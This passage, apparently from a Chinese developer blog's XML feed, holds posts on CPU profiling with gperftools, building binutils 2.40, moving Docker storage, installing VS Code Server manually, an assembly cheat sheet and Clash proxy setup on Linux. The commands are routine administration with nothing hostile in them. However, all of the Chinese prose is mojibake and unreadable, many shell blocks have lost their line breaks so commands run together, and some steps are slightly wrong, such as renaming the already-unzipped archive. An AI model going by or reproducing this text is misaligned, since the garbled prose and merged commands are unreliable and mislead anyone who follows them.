åŠ¨æ€é™æ€æ··ç”¨å®¹æ˜“å‡ºç°å¯¹å†…å­˜ç”³è¯·å’Œé‡Šæ”¾ä¸æ˜¯åŒä¸€ä¸ªå †ä¸Šï¼Œæ‰€æœ‰ä¼šå‡ºé”™</p><p>æ­£å¦‚ä¸‹é¢è¿è¡Œå›¾æ‰€ç¤ºï¼š</p></blockquote><p><img src="https://s2.loli.net/2023/08/22/Ko3Xy84leUrda5G.png" class="lazyload" data-srcset="https://s2.loli.net/2023/08/22/Ko3Xy84leUrda5G.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20230419162825350"></p><h1>Google CPU Profiler</h1></div><h2 id="ä¼˜åŠ¿">ä¼˜åŠ¿</h2><div class="story post-story"><p>google gprof æ˜¯æ”¯æŒåŠ¨æ€ä¾èµ–åº“æµ‹è¯•çš„ï¼Œä¹Ÿå³<code>.so/dll</code>ï¼Œ ç›¸æ¯”è¾ƒ GNU gprofæ¥è¯´ä¸éœ€è¦ç‰¹æ„ç¼–è¯‘æˆé™æ€ä¾èµ–åº“ã€‚</p><p><a href="https://gperftools.github.io/gperftools/cpuprofile-fileformat.html">Google CPU Profiler</a></p></div><h2 id="å®‰è£…">å®‰è£…</h2><div class="story post-story"><div class="tabs" id="install"><ul class="nav-tabs"><li class="tab active"><a class="#install-1">1.å‘½ä»¤è¡Œå®‰è£…</a></li><li class="tab"><a class="#install-2">2.ç¼–è¯‘å®‰è£…ï¼š</a></li></ul><div class="tab-content"><div class="tab-pane active" id="install-1"><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libgoogle-perftools-dev google-perftools</code></pre></div><div class="tab-pane" id="install-2"><pre class="language-bash" data-language="bash"><code class="language-bash">https://github.com/gperftools/gperftools<span class="token function">git</span> clone https://github.com/gperftools/gperftools<span class="token builtin class-name">cd</span> gperftools./autogen.sh./configure --prefix<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/gperftools-build --enable-frame-pointers<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span class="token function">ln</span> -s <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/gperftools-build/lib/libprofiler.so /usr/lib/libprofiler.so</code></pre><blockquote><p>æ³¨æ„äº‹é¡¹ï¼š</p><p><a href="https://github.com/gperftools/gperftools/blob/master/INSTALL">https://github.com/gperftools/gperftools/blob/master/INSTALL</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">If you are on x86-64 system, know that you have a <span class="token builtin class-name">set</span> of systemlibraries with frame-pointers enabled, and compile all yourapplications with -fno-omit-frame-pointer, <span class="token keyword">then</span> you can <span class="token builtin class-name">enable</span> thebuilt-in perftools stack unwinder by passing the--enable-frame-pointers flag to configure.Even with the use of libunwind, there are still known problems withstack unwinding on <span class="token number">64</span>-bit systems, particularly x86-64.  See the<span class="token string">"64-BIT ISSUES"</span> section <span class="token keyword">in</span> README.If you encounter problems, try compiling perftools with <span class="token string">'./configure--enable-frame-pointers'</span><span class="token builtin class-name">.</span>  Note you will need to compile yourapplication with frame pointers <span class="token punctuation">(</span>via <span class="token string">'gcc -fno-omit-frame-pointer...'</span><span class="token punctuation">)</span> <span class="token keyword">in</span> this case.</code></pre></blockquote><p><a href="https://gperftools.github.io/gperftools/cpuprofile.html">https://gperftools.github.io/gperftools/cpuprofile.html</a></p><p><a href="https://developer.ridgerun.com/wiki/index.php/Profiling_with_GPerfTools">https://developer.ridgerun.com/wiki/index.php/Profiling_with_GPerfTools</a></p></div></div></div></div><h2 id="ä½¿ç”¨">ä½¿ç”¨</h2><div class="story post-story"><p>1.<strong>ç¼–è¯‘ä½¿ç”¨</strong></p><p>ç¼–è¯‘æ—¶ æ·»åŠ <code>-lprofiler </code> ä½¿å…¶èƒ½å¤Ÿé“¾æ¥åˆ°<code>libprofiler.so</code> åŠ¨æ€åº“</p><p>æˆ–è€…åœ¨è¿è¡Œæ—¶ä½¿ç”¨ï¼š<code>LD_PRELOAD</code>è¿è¡Œæ—¶åŠ è½½åŠ¨æ€åº“</p><p><code>LD_PRELOAD=/usr/local/lib/libprofiler.so CPUPROFILE=test.prof ./path/to/bin</code></p><p><strong>LD_PRELOAD</strong>: Path to the <code>libprofiler.so</code> usually located at /usr/local/lib/ or /usr/lib/x86_64-linux-gnu for 64 bit systems.  æ ¹æ®<code>Configure --prefix=</code> æ¥å®šï¼Œ å¦‚æœæ²¡æœ‰è®¾ç½®<code>--prefix</code> é»˜è®¤åº”åœ¨<code>/usr/local/lib</code></p><p><strong>CPUPROFILE</strong>: Name of the output log file</p><p><strong>2.è¿è¡Œç¨‹åº</strong></p><p>ä½¿å…¶æ­£å¸¸ç»“æŸï¼Œ <strong><code>Ctrl+C</code> ä¸­æ–­ä¿¡å·ä¸ä¼šç”Ÿæˆæ—¥å¿—<code>XXX.prof</code>æ–‡ä»¶</strong></p><blockquote><p>Keep the application open or running until it finishes, in this mode if the execution is canceled for example with Ctrl+C the output file will not be generated.</p></blockquote><p>2.è¿è¡Œä¸­äº§ç”Ÿï¼š</p><p><code>CPUPROFILE=test.prof CPUPROFILESIGNAL=12 ./path/to/bin</code></p><p>å¯åŠ¨æ—¶æ·»åŠ <code>CPUPROFILESIGNAL=12</code> , ä¿¡å·æ ‡å¿—ï¼Œ</p><p>å½“æƒ³å¼€å§‹è®¡ç®—æ—¶<code> kill -12 $PID</code></p><p>ä¸­é—´ç»“æŸæ—¶ å†æ¬¡<code>kill -12 $PID</code></p><p>è·å¾— <code>test.prof.0.... n</code></p><blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2.2</span> Also you can use <span class="token function">killall</span> <span class="token builtin class-name">command</span> to send the -12 signal<span class="token function">killall</span> -12 /path/to/bin<span class="token number">3</span>. Leave the program <span class="token keyword">until</span> the point you want to profile it, <span class="token keyword">then</span> run again:<span class="token function">killall</span> -12 /path/to/binYou will notice the following output when the output <span class="token function">file</span> was correctly generated:Using signal <span class="token number">12</span> as cpu profiling switchPROFILE: interrupts/evictions/bytes <span class="token operator">=</span> <span class="token number">4773</span>/1826/231936<span class="token number">4</span>. Once the application ended the test.prof.0 <span class="token function">file</span> contains the CPU profile information. To get a graphical output run:google-pprof -gv ./path/to/bin test.prof</code></pre></blockquote><p>3.<strong>ç”Ÿæˆè¿è¡Œæ—¶é—´å›¾</strong></p><blockquote><p>å¦‚æœå‡ºç°: <code>DWARF error: invalid or unhandled FORM value: 0x25</code></p><p>å‚è€ƒ:  <a href="https://www.sizaif.com/posts/1b7755b0/">Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬</a></p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ç”Ÿæˆå›¾ç‰‡ï¼Œ ç»ˆç«¯æ— æ³•é¢„è§ˆ</span>google-pprof --gv ./path/to/bin test.prof<span class="token comment"># ç”Ÿæˆhtmlé¢„è§ˆï¼Œ  ç»ˆç«¯æ— æ³•é¢„è§ˆ</span>google-pprof --web ./path/to/bin test.prof<span class="token comment"># ç”Ÿæˆpdfï¼Œ ç”Ÿæˆåéœ€è¦ä¸‹è½½æŸ¥çœ‹</span>google-pprof --pdf ./path/to/bin test.prof <span class="token operator">></span> output.pdf</code></pre><p><img src="https://s2.loli.net/2023/08/22/Mzf9ywWn2lEK5RB.png" class="lazyload" data-srcset="https://s2.loli.net/2023/08/22/Mzf9ywWn2lEK5RB.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Single node GPerfTools.png"></p><p>1ä¸ªå•ä½ å¤§çº¦10msï¼Œ</p><p>æ‰€ä»¥ 118 ~= 1.18s</p><h1>æµ‹è¯•è„šæœ¬</h1><div class="tabs" id="gprofscript"><ul class="nav-tabs"><li class="tab active"><a class="#gprofscript-1">gnu gprof</a></li><li class="tab"><a class="#gprofscript-2">google gprof</a></li></ul><div class="tab-content"><div class="tab-pane active" id="gprofscript-1"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">gprof2dot_path</span><span class="token operator">=</span><span class="token string">"path to gprof2dot"</span> <span class="token comment">#$1: Tested program (path of binary file)</span><span class="token comment">#$2: Total execution time of tested program</span><span class="token comment"># gprof ç‰ˆæœ¬ä¸º2.34  ä¸æ”¯æŒ DWARFV5</span><span class="token comment"># æŠ¥é”™ï¼š BFD: DWARF error: invalid or unhandled FORM value: 0x25</span><span class="token comment">#gprof $1 > $1.log</span><span class="token comment"># ä½¿ç”¨resources/binutils24lib/bin/gprof ï¼Œ2.40ç‰ˆæœ¬å¯æ”¯æŒ DWARFV5</span><span class="token comment"># å·²æå‰ ln -s &lt;path/to/resources/binutils24lib/bin/gprof> /usr/bin/gprof24 </span>gprof24 <span class="token variable">$1</span> <span class="token operator">></span> <span class="token variable">$1</span>.logpython3 <span class="token variable">$&#123;gprof2dot_path&#125;</span>/gprof2dot.py -t <span class="token variable">$2</span> <span class="token variable">$1</span>.log <span class="token operator">|</span> dot -Tpng -o <span class="token variable">$1</span>.png</code></pre></div><div class="tab-pane" id="gprofscript-2"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">target_openssl_path</span><span class="token operator">=</span>path to binary <span class="token function">file</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token variable">$1</span>google-pprof --pdf <span class="token variable">$&#123;target_openssl_path&#125;</span>/exe test.prof.<span class="token variable">$&#123;id&#125;</span> <span class="token operator">></span> test.prof_<span class="token variable">$&#123;id&#125;</span>.pdf</code></pre></div></div></div></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> æ€§èƒ½æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux ç¼–è¯‘Binutils2.4</title>
      <link href="/posts/1b7755b0/"/>
      <url>/posts/1b7755b0/</url>
      
        <content type="html"><![CDATA[<h1>Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬</h1><p>é»˜è®¤çš„Binutilsç‰ˆæœ¬ä¸º</p><pre class="language-bash" data-language="bash"><code class="language-bash">binutils:  Installed: <span class="token number">2.34</span>-6ubuntu1.4  Candidate: <span class="token number">2.34</span>-6ubuntu1.4  Version table: *** <span class="token number">2.34</span>-6ubuntu1.4 <span class="token number">500</span>        <span class="token number">500</span> http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates/main amd64 Packages        <span class="token number">500</span> http://security.ubuntu.com/ubuntu focal-security/main amd64 Packages        <span class="token number">100</span> /var/lib/dpkg/status     <span class="token number">2.34</span>-6ubuntu1 <span class="token number">500</span>        <span class="token number">500</span> http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal/main amd64 Package</code></pre><p>é»˜è®¤çš„2.34 åŒ…å«çš„ <code>Objdump</code>,<code>gprof</code>,<code>BDF</code> ,<code>lld</code>,ç­‰æ˜¯ä¸å…¼å®¹æœ€æ–°çš„<code>DWARF-V5</code>çš„</p><p>è€Œ<code>Clang-14</code>  -g ç”Ÿæˆçš„ç¼–è¯‘ä¿¡æ¯æ˜¯ä»¥<code>DWARF-V5</code> æœ€æ–°ç‰ˆæœ¬ä¸ºåŸºç¡€çš„ï¼Œ</p><p>æ‰€ä»¥å°±ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">DWARF error: invalid or unhandled FORM value: 0x25</code></pre><p>å›°æ‰°è®¸ä¹…</p><ol><li><p>ä¸€ç§è§£å†³æ–¹å¼æ˜¯clang++ ç­‰æœ€æ–°ç¼–è¯‘å™¨ç¼–è¯‘æ—¶æ·»åŠ  <code>-gdwarf-4</code>  å‚æ•°ä½¿å…¶ä½¿ç”¨<code>DWARF</code>V4ç‰ˆæœ¬ã€‚</p><p>ä½†è¿™ç§æ–¹æ³•æœ‰äº‹å¹¶ä¸å¯è¡Œ</p></li></ol><p>â€‹<a href="https://blog.csdn.net/sizaif/article/details/129021502">ASAN æ£€æµ‹å†…å­˜é”™è¯¯ debug</a></p><p>ç´¢æ€§å°±å®‰è£…æœ€æ–°çš„ç‰ˆæœ¬å§ï¼ Binutils2.4 æ˜¯æ”¯æŒ <code>DWARF-V5</code>çš„</p><p>æˆ–è€…ç›´æ¥ä¸‹è½½æˆ‘å·²ç¼–è¯‘å¥½çš„ï¼š</p><p><a href="https://www.aliyundrive.com/s/9QAyh7XM1dK">  æå–ç : 5zo2 </a></p><p><strong>å»ºè®®ä¸€ä¸‹å‘½ä»¤ä½¿ç”¨å¸¦æœ‰ç®¡ç†å‘˜ç”¨æˆ·æ‰§è¡Œï¼Œè‹¥æ²¡æœ‰æƒé™ï¼Œåˆ™åœ¨å‘½ä»¤å‰åŠ <code>sudo </code></strong></p><ol><li><p>ä¸‹è½½æºç ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://ftp.gnu.org/gnu/binutils/binutils-2.40.tar.gz</code></pre></li><li><p>è§£å‹ç¼–è¯‘</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -zxvf XXXX<span class="token builtin class-name">cd</span> XXXX./Configure --prefix<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/build-install<span class="token function">make</span> <span class="token function">make</span> <span class="token function">install</span></code></pre></li><li><p>å¦‚æœConfigureæ—¶æç¤º ç¼ºå°‘GMP4.2+,MPFR3,1,0+ ä¹‹ç±»çš„ä¾èµ–çš„è¯</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> ftp://gcc.gnu.org/pub/gcc/infrastructure/gmp-6.1.0.tar.bz2<span class="token function">wget</span> ftp://gcc.gnu.org/pub/gcc/infrastructure/mpfr-3.1.4.tar.bz2<span class="token function">wget</span> ftp://gcc.gnu.org/pub/gcc/infrastructure/mpc-1.0.3.tar.gz</code></pre><p>åˆ†åˆ«è§£å‹ è¿›å…¥å¯¹åº”ç›®å½•</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -jxvf XXX<span class="token builtin class-name">cd</span> XXX./Configure<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></code></pre></li><li><p>WARNING: `makeinfoâ€™ is missing on your system.  You should only need it if</p><p>ä¹‹ç±»çš„é”™è¯¯</p><p>å®‰è£…ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> texinfo<span class="token function">apt-get</span> <span class="token function">install</span> flex<span class="token function">apt-get</span> <span class="token function">install</span> bison</code></pre></li><li><p>å¦‚æœå‡ºç° <code>fatal error: sys/cdefs.h: No such file or directory</code></p><blockquote><p>åœ¨64ä½çš„<a href="https://so.csdn.net/so/search?q=Ubuntu&amp;spm=1001.2101.3001.7020">Ubuntu</a>å¦‚æœæ‰§è¡ŒX86å¹³å°32ä½ç¼–è¯‘ï¼Œgcc -m32 -o x  x.cä¼šæŠ¥é”™ï¼šfatal error: sys/cdefs.h: No such file or directoryapt-get install libc6-dev-i386</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> libc6-dev-i386</code></pre></li></ol><p>ä¸Šè¿°é—®é¢˜éƒ½è§£å†³åï¼Œ å»ºè®®åˆ é™¤æ‰å½“å‰ç›®å½•ï¼Œ é‡æ–°è§£å‹<code>Binutils</code>ï¼Œ é‡æ–°æ‰§è¡Œ:</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -zxvf XXXX<span class="token builtin class-name">cd</span> XXXX./Configure --prefix<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/build-install<span class="token function">make</span> <span class="token function">make</span> <span class="token function">install</span></code></pre><p>æ‰§è¡Œå®Œæˆå ï¼Œ ä¼šåœ¨å½“å‰ç›®å½•ä¸‹çš„<code>/build-install/bin</code>ç›®å½•ä¸­å‡ºç°æ–°å®‰è£…çš„<code>gprof,objdump,lld </code>ç­‰</p><p>ä½¿ç”¨é“¾æ¥å‘½ä»¤è¿›è¡Œè¿æ¥</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#ä¾‹å¦‚:</span><span class="token function">ln</span> -s <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">pwd</span><span class="token variable">`</span></span>/bin/gprof /usr/bin/gprof24</code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Binutils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸‹ä»ç³»ç»Ÿè·¯å¾„ä¸‹è¿ç§»dockerå®¹å™¨ä¸é•œåƒ</title>
      <link href="/posts/eae714ed/"/>
      <url>/posts/eae714ed/</url>
      
        <content type="html"><![CDATA[<h1>ä»ç³»ç»Ÿè·¯å¾„ä¸‹è¿ç§»dockerå®¹å™¨å’Œé•œåƒ</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp">sudo systemctl stop docker# å…ˆåœæ­¢dockersudo mkdir docker_data #è·¯å¾„æ˜¯ <span class="token operator">/</span>home<span class="token operator">/</span>jq<span class="token operator">/</span>docker_datasudo rsync <span class="token operator">-</span>aP <span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>docker <span class="token operator">/</span>home<span class="token operator">/</span>jq<span class="token operator">/</span>docker_data # rsyncæ˜¯å¤åˆ¶æ•°æ®ï¼Œä½œç”¨å’Œcpç›¸åŒsudo mv <span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>docker <span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>docker<span class="token punctuation">.</span>bak #åŸæ¥æ•°æ®åšå¤‡ä»½sudo ln <span class="token operator">-</span>s <span class="token operator">/</span>home<span class="token operator">/</span>jq<span class="token operator">/</span>docker_data<span class="token operator">/</span>docker <span class="token operator">/</span>var<span class="token operator">/</span>lib<span class="token operator">/</span>docker #è½¯è¿æ¥sudo systemctl daemon<span class="token operator">-</span>reload #é‡æ–°åŠ è½½é…ç½®sudo systemctl restart docker #é‡æ–°å¯åŠ¨docker</code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode Server</title>
      <link href="/posts/606d0466/"/>
      <url>/posts/606d0466/</url>
      
        <content type="html"><![CDATA[<h1>vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode server</h1><p>å½“vscodeç‰ˆæœ¬æ›´æ–°åï¼Œ éœ€è¦é‡æ–°å®‰è£…vscode serverï¼Œ ç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œç»å¸¸ä¸‹è½½ä¸ä¸‹æ¥ï¼Œæ‰€ä»¥é‡‡ç”¨æ‰‹åŠ¨å®‰è£…çš„æ–¹å¼</p><p>step1. è¿›å…¥å®¹å™¨å†…éƒ¨</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ docker <span class="token builtin class-name">exec</span> -it <span class="token operator">&lt;</span>containerid<span class="token operator">></span> /bin/bash$ <span class="token builtin class-name">cd</span> ~/.vscode-server/bin</code></pre><p>step2. è·å¾—vscode ç‰ˆæœ¬ä¿¡æ¯</p><p><code>$&#123;commit_id&#125; = ee2b180d582a7f601fa6ecfdad8d9fd269ab1884</code></p><p>å¸®åŠ©-&gt;help</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ç‰ˆæœ¬<span class="token operator">:</span> <span class="token number">1.76</span><span class="token punctuation">.</span><span class="token number">2</span> <span class="token punctuation">(</span>user setup<span class="token punctuation">)</span>æäº¤<span class="token operator">:</span> ee2b180d582a7f601fa6ecfdad8d9fd269ab1884æ—¥æœŸ<span class="token operator">:</span> <span class="token number">2023</span><span class="token operator">-</span><span class="token number">03</span><span class="token operator">-</span><span class="token number">14</span>T17<span class="token operator">:</span><span class="token number">55</span><span class="token operator">:</span><span class="token number">54.936</span>ZElectron<span class="token operator">:</span> <span class="token number">19.1</span><span class="token punctuation">.</span><span class="token number">11</span>Chromium<span class="token operator">:</span> <span class="token number">102.0</span><span class="token punctuation">.</span><span class="token number">5005.196</span>Node<span class="token punctuation">.</span>js<span class="token operator">:</span> <span class="token number">16.14</span><span class="token punctuation">.</span><span class="token number">2</span>V8<span class="token operator">:</span> <span class="token number">10.2</span><span class="token punctuation">.</span><span class="token number">154.26</span><span class="token operator">-</span>electron<span class="token punctuation">.</span><span class="token number">0</span>OS<span class="token operator">:</span> Windows_NT x64 <span class="token number">10.0</span><span class="token punctuation">.</span><span class="token number">22621</span>æ²™ç›’åŒ–<span class="token operator">:</span> No</code></pre><p>step3. æ‰‹åŠ¨ä¸‹è½½</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">wget</span> https://vscode.cdn.azure.cn/stable/<span class="token variable">$&#123;commit_id&#125;</span>/vscode-server-linux-x64.tar.gz$ <span class="token function">tar</span> -zxvf vscode-server-linux-x64.tar.gz$ <span class="token function">mv</span> vscode-server-linux-x64 <span class="token variable">$&#123;commit_id&#125;</span></code></pre><p>è‡³æ­¤é‡æ–°å¯åŠ¨vscode è¿æ¥å®¹å™¨</p><p>è„šæœ¬è‡ªåŠ¨åŒ–æ‰§è¡Œï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#bin/bash</span><span class="token assign-left variable">commit_id</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token function">wget</span> https://vscode.cdn.azure.cn/stable/<span class="token variable">$&#123;commit_id&#125;</span>/vscode-server-linux-x64.tar.gz<span class="token function">tar</span> -zxvf vscode-server-linux-x64.tar.gz<span class="token function">mv</span> vscode-server-linux-x64 $<span class="token punctuation">&#123;</span>commit_id</code></pre><p>ä¿å­˜è‡³åŒç›®å½•ä¸‹ï¼Œ chmod +x ï¼Œ ç„¶åè¿è¡Œå³å¯</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸ç”¨æ±‡ç¼–ä»£ç æ€»ç»“</title>
      <link href="/posts/5ce1dce5/"/>
      <url>/posts/5ce1dce5/</url>
      
        <content type="html"><![CDATA[<pre class="language-cpp" data-language="cpp"><code class="language-cpp">cmp a<span class="token punctuation">,</span>b <span class="token comment">// æ¯”è¾ƒaä¸b</span>mov a<span class="token punctuation">,</span>b <span class="token comment">// æŠŠbå€¼é€ç»™aå€¼ï¼Œä½¿a=b</span>ret <span class="token comment">// è¿”å›ä¸»ç¨‹åº</span>nop <span class="token comment">// æ— ä½œç”¨ï¼Œè‹±æ–‡ï¼ˆno operationï¼‰ç®€å†™ï¼Œæ„æ€â€œdo nothingâ€ï¼ˆæœºå™¨ç 90ï¼‰</span>call <span class="token comment">// è°ƒç”¨å­ç¨‹åºï¼Œå­ç¨‹åºä»¥retç»“å°¾</span>je æˆ–jz <span class="token comment">// ç›¸ç­‰åˆ™è·³ï¼ˆæœºå™¨ç æ˜¯74æˆ–84ï¼‰</span>jne æˆ–jnz <span class="token comment">// ä¸ç›¸ç­‰åˆ™è·³ï¼ˆæœºå™¨ç æ˜¯75æˆ–85ï¼‰</span>jmp <span class="token comment">// æ— æ¡ä»¶è·³ï¼ˆæœºå™¨ç æ˜¯EBï¼‰</span>jb <span class="token comment">// è‹¥å°äºåˆ™è·³</span>ja <span class="token comment">// è‹¥å¤§äºåˆ™è·³</span>jg <span class="token comment">// è‹¥å¤§äºåˆ™è·³</span>jge <span class="token comment">// è‹¥å¤§äºç­‰äºåˆ™è·³</span>jl <span class="token comment">// è‹¥å°äºåˆ™è·³</span>pop xxx <span class="token comment">// xxxå‡ºæ ˆ</span>push xxx <span class="token comment">// xxxå‹æ ˆ</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxä¸Šé…ç½®Clashä»£ç†</title>
      <link href="/posts/47973370/"/>
      <url>/posts/47973370/</url>
      
        <content type="html"><![CDATA[<h1>åœ¨linuxä¸Šé…ç½®Clashä»£ç†</h1><blockquote><p>Clash for linux githubåœ°å€ï¼š <a href="https://github.com/Dreamacro/clash/releases">https://github.com/Dreamacro/clash/releases</a></p></blockquote><h2 id="ä¸‹è½½è½¯ä»¶åŒ…">ä¸‹è½½è½¯ä»¶åŒ…</h2><div class="story post-story"><ol><li><p>ç›´æ¥æ‰“å¼€è¿æ¥å¹¶ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬<code>clash-linux-amd64-XXX.gz)</code></p></li><li><p>æˆ–è€…åœ¨ç»ˆç«¯ä¸Šç”¨<code>wget</code>ä¸‹è½½</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> <span class="token operator">&amp;&amp;</span> <span class="token function">mkdir</span> clash$ <span class="token builtin class-name">cd</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> clash<span class="token function">wget</span> -N --no-check-certificate https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v3-v1.13.0.gz</code></pre></li><li><p><code>gunzip clash-linux-amd64-v3-v1.13.0.gz</code></p></li><li><p><code>mv  clash-linux-amd64-v3-v1.13.0.gz clash</code></p></li><li><p><code>chmod +x clash</code></p></li></ol></div><h2 id="æ ¹æ®ä»£ç†æä¾›å•†æä¾›çš„è®¢é˜…é“¾æ¥ä¸‹è½½ä»£ç†é…ç½®æ–‡ä»¶">æ ¹æ®ä»£ç†æä¾›å•†æä¾›çš„è®¢é˜…é“¾æ¥ä¸‹è½½ä»£ç†é…ç½®æ–‡ä»¶</h2><div class="story post-story"><blockquote><p><code>https://XXXXX </code> æ˜¯è®¢é˜…é“¾æ¥</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">wget</span> -O config.yaml https://XXXXX </code></pre></div><h2 id="å¯åŠ¨Clash">å¯åŠ¨Clash</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">./clash -d <span class="token builtin class-name">.</span></code></pre></div><h2 id="é…ç½®Clash">é…ç½®Clash</h2><div class="story post-story"><p>æµè§ˆå™¨è®¿é—®<code>http://clash.razord.top/#/proxies</code> è¿›è¡Œé…ç½®</p><p>è®¾ç½®<code>socks5</code> æˆ–<code>https/http</code>ç«¯å£</p></div><h2 id="ç»ˆç«¯é…ç½®ä»£ç†ä½¿å…¶ç”Ÿæ•ˆ">ç»ˆç«¯é…ç½®ä»£ç†ä½¿å…¶ç”Ÿæ•ˆ</h2><div class="story post-story"><blockquote><p><code>XXX</code>ä¸ºä¸Šä¸€æ­¥è®¾ç½®çš„ç«¯å£</p><p><code>socks5</code>ä¸ºè®¾ç½®çš„<code>socks5</code>ä»£ç†é€šé“ï¼Œ å¦‚æœä¸º<code>http</code>åˆ™å¯¹åº”çš„ä¿®æ”¹å³å¯</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">export</span> <span class="token assign-left variable">all_proxy</span><span class="token operator">=</span>socks5://127.0.0.1:XXXX</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
          <category> Clash </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> Clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Llvm åˆ›å»ºå¤–éƒ¨è°ƒç”¨å‡½æ•°æ–¹æ³•</title>
      <link href="/posts/dbb96a4a/"/>
      <url>/posts/dbb96a4a/</url>
      
